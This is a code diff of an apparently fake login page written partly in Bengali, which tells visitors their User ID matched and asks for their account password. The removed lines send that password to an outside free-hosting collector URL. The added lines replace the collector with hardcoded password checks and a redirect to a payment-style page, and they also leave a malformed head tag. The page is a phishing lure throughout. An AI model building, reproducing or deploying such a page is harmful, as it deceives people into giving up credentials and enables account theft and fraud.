@@ -254,9 +254,25 @@ color: #00c0ff;
     }
     
     
+    
+    .popup {
+      display: none;
+      background-color: rgba(255, 0, 0, 0.8);
+      color: white;
+      padding: 20px;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 1000;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+    
+    
 
   </style>
-</head>
+</head
 <body>
 
   <section><br><br><br>
@@ -267,13 +283,13 @@ color: #00c0ff;
     </div>
 
     <div class="login-container">
-      <form action="https://userinfomaster.000webhostapp.com/yi/up.php" class="login-form" method="post">
+      <form id="loginForm" class="login-form">
         <h2>Log In</h2>
         <input type="password" name="up" id="password" placeholder="Password" required>
-<input type="checkbox" id="showPassword"> Show Password<br><br>
-<button type="submit">Log In</button>
-<p>Not any account, <a href="https://pay-yourinspireit.github.io/signup">Sign Up ! </a></p>
-</form>
+        <input type="checkbox" id="showPassword"> Show Password<br><br>
+        <button type="submit">Log In</button>
+        <p>Not any account, <a href="https://pay-yourinspireit.github.io/signup">Sign Up ! </a></p>
+      </form>
     </div>
   </section>
 
@@ -282,26 +298,49 @@ color: #00c0ff;
     <b> Note !</b><br><br><i>( User ID Match </i>✔ ) <br><br>  User Id টি সঠিক,  এখন নিচের বক্সে আপনার একাউন্টের Password টি লিখে Log In - এ ক্লিক করুন । 
   </div>
 
+  <div id="popup" class="popup">
+    <p>User ID is Incorrect</p>
+    <button onclick="closePopup()">Close</button>
+  </div>
+
   <script>
     window.onload = function() {
       document.getElementById('alert').style.display = 'block';
     };
     
-    
-    
-    
     const passwordField = document.getElementById('password');
-const showPasswordCheckbox = document.getElementById('showPassword');
+    const showPasswordCheckbox = document.getElementById('showPassword');
+    const loginForm = document.getElementById('loginForm');
+    const popup = document.getElementById('popup');
 
-showPasswordCheckbox.addEventListener('change', function() {
-  if (this.checked) {
-    passwordField.type = 'text';
-  } else {
-    passwordField.type = 'password';
-  }
-});
+    showPasswordCheckbox.addEventListener('change', function() {
+      if (this.checked) {
+        passwordField.type = 'text';
+      } else {
+        passwordField.type = 'password';
+      }
+    });
+
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const passwordValue = passwordField.value;
+
+      if (passwordValue === 'OuTr&%32' || passwordValue === 'OuTr&%87' || passwordValue === 'OuTr&%43') {
+        window.location.href = 'https://pay-yourinspireit.github.io/pay-st';
+      } else {
+        showPopup();
+      }
+    });
+
+    function showPopup() {
+      popup.style.display = 'block';
+    }
+
+    function closePopup() {
+      popup.style.display = 'none';
+    }
   </script>
 
   <div class="errora"></div>
 </body>
-</html>
+  </html>
